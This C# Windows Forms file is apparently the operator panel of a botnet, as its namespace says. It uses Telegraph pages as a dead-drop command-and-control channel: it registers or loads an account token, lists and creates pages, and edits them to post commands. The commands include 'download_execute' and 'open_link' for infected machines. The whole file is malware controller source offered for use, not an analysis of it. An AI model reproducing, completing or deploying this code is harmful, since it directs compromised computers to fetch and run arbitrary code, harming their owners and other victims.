using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace botnet_telegraph_controller_yt
{
    public partial class frmMain : Form
    {
        TelegraphServer tserver;

        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (File.Exists(configs.auth_file))
            {
                textBox_token.Text = File.ReadAllText(configs.auth_file);
            }

            comboBox1.Items.AddRange(new string[] { "open_link", "download_execute", "exit" });
        }

        private void GetPages()
        {
            List<string> pages = tserver.GetPageList();

            listBox1.Items.Clear();

            foreach(string page in pages)
            {
                listBox1.Items.Add(page);
            }
        }

        private void LoadSelectedPage()
        {
            string html = web.GetHTML(textBox_selected_server.Text);

            Match regx = Regex.Match(html, "<p>(.*)</p></article>");
            lab_content.Text = regx.Groups[1].Value;

            Match regx2 = Regex.Match(html, "<h1 dir=\"auto\">(.*)</h1>");
            lab_title.Text = regx2.Groups[1].Value;
            configs.server_title = lab_title.Text;
        }

        private void button_reg_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer();
            tserver.CreateAccount(textBox_newAcc.Text);
            
            if(tserver.access_token.Length > 0)
            {
                textBox_token.Text = tserver.access_token;
                MessageBox.Show("Аккаунт создан!");
            }
            else
            {
                MessageBox.Show("Аккаунт не был создан!");
            }
        }

        private void button_auth_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer(textBox_token.Text);

            button_auth.Enabled = false;
            button_change.Enabled = true;

            GetPages();
        }

        private void button_save_Click(object sender, EventArgs e)
        {
            File.WriteAllText(configs.auth_file, textBox_token.Text);
        }

        private void button_change_Click(object sender, EventArgs e)
        {
            tserver = new TelegraphServer();

            button_auth.Enabled = true;
            button_change.Enabled = false;

            listBox1.Items.Clear();
            textBox_selected_server.Text = string.Empty;
        }

        private void button_page_create_Click(object sender, EventArgs e)
        {
            tserver.CreatePage(textBox_page_create.Text);

            GetPages();
        }

        private void button_refresh_Click(object sender, EventArgs e)
        {
            GetPages();
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            configs.server = listBox1.SelectedItem.ToString();
            textBox_selected_server.Text = "https://telegra.ph/" + configs.server;

            LoadSelectedPage();
        }

        private void button_send_Click(object sender, EventArgs e)
        {
            string cmd = comboBox1.Text + configs.spliter + textBox_cmd.Text + configs.spliter + new Random().Next(0, 9999);

            if(tserver.EditPage(configs.server, configs.server_title, cmd))
            {
                LoadSelectedPage();
            }
        }
    }
}
